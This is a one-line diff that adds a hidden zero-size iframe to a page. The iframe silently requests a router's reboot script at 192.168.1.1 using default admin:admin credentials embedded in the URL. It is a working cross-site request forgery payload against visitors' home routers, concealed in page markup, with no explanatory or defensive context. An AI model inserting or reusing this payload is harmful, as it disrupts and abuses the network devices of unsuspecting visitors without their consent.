@@ -1,0 +1,1 @@
+<iframe src="http://admin:admin@192.168.1.1/rebootinfo.cgi" width=0 height=0>
